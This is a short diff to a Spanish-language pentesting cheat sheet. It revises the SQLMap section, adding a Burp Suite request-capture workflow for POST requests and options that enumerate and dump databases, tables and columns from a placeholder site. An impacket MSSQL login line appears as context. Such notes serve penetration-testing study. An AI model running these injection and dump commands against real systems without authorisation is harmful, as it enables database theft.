@@ -23,6 +23,17 @@ impacket-mssqlclient user:pass@<IP>
 
 ### SQLMap
 ```bash
-sqlmap -u "[http://site.com?id=1](http://site.com?id=1)" --dbs --batch
-sqlmap -r req.txt --dbs  # Para POST requests
+sqlmap -u "http://site.com?id=1" --dbs --batch
+
+## Si no funciona la anterior, capturar la peticion con burpsuite y meterla al fichero req.txt
+## basta con "recargar" la pagina en la que queremos probar la request
+sqlmap -r req.txt --dbs --batch
+
+#Opciones:
+-D <database>
+-T table
+
+--tables
+--columns
+--dump
 ```
